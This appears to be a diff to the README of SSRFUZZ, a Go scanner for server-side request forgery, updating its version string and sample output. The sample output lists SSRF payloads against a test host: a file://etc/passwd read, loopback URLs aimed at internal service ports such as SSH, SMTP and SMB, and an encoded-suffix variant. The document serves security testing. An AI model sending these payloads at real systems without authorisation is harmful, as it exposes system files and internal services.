@@ -14,7 +14,7 @@ go get github.com/ryandamour/ssrfuzz
 
 ```go
 ===============================================================
-SSRFUZZ v0.0.1
+SSRFUZZ v1.0.0
 by Ryan D'Amour @ryandamour 
 ===============================================================A scanner for all your SSRF Fuzzing needs
 
@@ -46,12 +46,12 @@ echo "http://192.168.1.10/test.php?u=" | go run main.go scan
 * http://192.168.1.10/test.php?u=file://etc/passwd 200
 
 [!] Interesting payloads found
-* http://192.168.1.10/test.php?u=http://127.0.0.1:80 200
-* http://192.168.1.10/test.php?u=http://127.0.0.1:8080 500
-* http://192.168.1.10/test.php?u=http://127.0.0.1:443 500
-* http://192.168.1.10test.php?u=http://127.0.0.1:22 500
-* http://192.168.1.10/test.ph?u=http://127.0.0.1:25 500
-* http://192.168.1.10/test.php?u=http://127.0.0.1:445 500
+* http://192.168.1.10/test.php?u=http://127.1.0.0:80 200
+* http://192.168.1.10/test.php?u=http://127.1.0.0:8080 500
+* http://192.168.1.10/test.php?u=http://127.1.0.0:443 500
+* http://192.168.1.10test.php?u=http://127.1.0.0:22 500
+* http://192.168.1.10/test.ph?u=http://127.1.0.0:25 500
+* http://192.168.1.10/test.php?u=http://127.1.0.0:445 500
 
 [!] Interesting payloads found
 * http://192.168.1.10/test.php?u=http://127.127.127.127:80%23%OA 200
@@ -86,12 +86,12 @@ echo "http://192.168.1.10/test.php?u=" | go run main.go scan --skip-scheme --ski
 ...
 
 [!] Interesting payloads found
-* http://192.168.1.10/test.php?u=http://127.0.0.1:80 200
-* http://192.168.1.10/test.php?u=http://127.0.0.1:8080 500
-* http://192.168.1.10/test.php?u=http://127.0.0.1:443 500
-* http://192.168.1.10/test.php?u=http://127.0.0.1:22 500
-* http://192.168.1.10/test.php?u=http://127.0.0.1:25 500
-* http://192.168.1.10/test.php?u=http://127.0.0.1:445 500
+* http://192.168.1.10/test.php?u=http://127.1.0.0:80 200
+* http://192.168.1.10/test.php?u=http://127.1.0.0:8080 500
+* http://192.168.1.10/test.php?u=http://127.1.0.0:443 500
+* http://192.168.1.10/test.php?u=http://127.1.0.0:22 500
+* http://192.168.1.10/test.php?u=http://127.1.0.0:25 500
+* http://192.168.1.10/test.php?u=http://127.1.0.0:445 500
 ```
 
 ## Contributing
